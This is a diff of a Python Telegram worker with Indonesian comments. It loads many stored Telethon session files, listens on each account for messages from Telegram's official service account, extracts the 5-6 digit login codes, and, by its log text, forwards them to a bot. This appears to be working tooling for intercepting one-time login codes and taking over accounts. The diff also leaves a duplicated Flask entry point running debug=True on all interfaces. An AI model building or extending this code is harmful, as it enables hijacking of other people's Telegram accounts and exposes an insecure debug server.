@@ -376,12 +376,13 @@ async def forward_handler(event, client_name):
     text_msg = getattr(event, "raw_text", "") or ""
     sender = await event.get_sender()
 
+    # Hanya lanjut kalau pesan dari official Telegram
     if sender.id != 777000:
         return
 
     print(f"[Worker][{client_name}] Pesan resmi Telegram: {text_msg}")
 
-    otp_match = re.findall(r"\b\d{4,6}\b", text_msg)
+    otp_match = re.findall(r"\b\d{5,6}\b", text_msg)
     if otp_match:
         otp_code = otp_match[0]
         try:
@@ -396,11 +397,9 @@ async def forward_handler(event, client_name):
 async def worker_main():
     print("[Worker] Starting...")
     clients = {}
-
     while True:
         try:
             for fn in os.listdir(SESSION_DIR):
-                # hanya ambil file .session yang valid
                 if not fn.endswith(".session") or ".pending" in fn:
                     continue
 
@@ -411,65 +410,45 @@ async def worker_main():
                 base_path = os.path.join(SESSION_DIR, base)
                 print(f"[Worker] Loading client for {base_path} ...")
                 client = TelegramClient(base_path, api_id, api_hash)
-
-                # --- koneksi ke Telegram ---
                 try:
                     await client.connect()
                 except Exception as e:
                     print(f"[Worker] Gagal connect {base}: {e}")
                     continue
 
-                # --- pastikan akun sudah login ---
                 if not await client.is_user_authorized():
                     print(f"[Worker] Session {base} belum authorized, skip.")
                     await client.disconnect()
                     continue
 
-                # --- tampilkan info akun ---
                 me = await client.get_me()
-                print(f"[Worker] ✅ Connected sebagai {getattr(me, 'first_name', str(me))} (@{getattr(me, 'username', '')})")
+                print(f"[Worker] ✅ Connected sebagai {getattr(me,'first_name',str(me))} (@{getattr(me,'username','')})")
 
-                # --- handler pesan masuk ---
                 @client.on(events.NewMessage)
                 async def _handler(event, fn=base):
                     try:
-                        sender = await event.get_sender()
-                        if not sender:
-                            return
-
-                        # Hanya proses pesan dari akun resmi Telegram
-                        if getattr(sender, "username", "").lower() == "telegram" or sender.id == 777000:
-                            print(f"[Worker] 📩 Pesan resmi Telegram diterima di {fn}, meneruskan ke bot...")
-                            await forward_handler(event, fn)
-                        else:
-                            # abaikan semua pesan lain
-                            print(f"[Worker] Pesan dari {getattr(sender, 'username', sender.id)} diabaikan.")
-                            return
-
+                        await forward_handler(event, fn)
                     except Exception as e:
                         print(f"[Worker] Error di handler {fn}: {e}")
 
-                # --- jalankan client ---
                 clients[base] = client
                 asyncio.create_task(client.run_until_disconnected())
-
         except Exception as e:
             print(f"[Worker] Loop error: {e}")
 
         await asyncio.sleep(5)
 
-
 def start_worker_thread():
     def _run():
         asyncio.run(worker_main())
-
     t = threading.Thread(target=_run, daemon=True)
     t.start()
 
-
-# Mulai worker di background
 start_worker_thread()
 
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
 # Jalankan Flask di thread utama
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
+
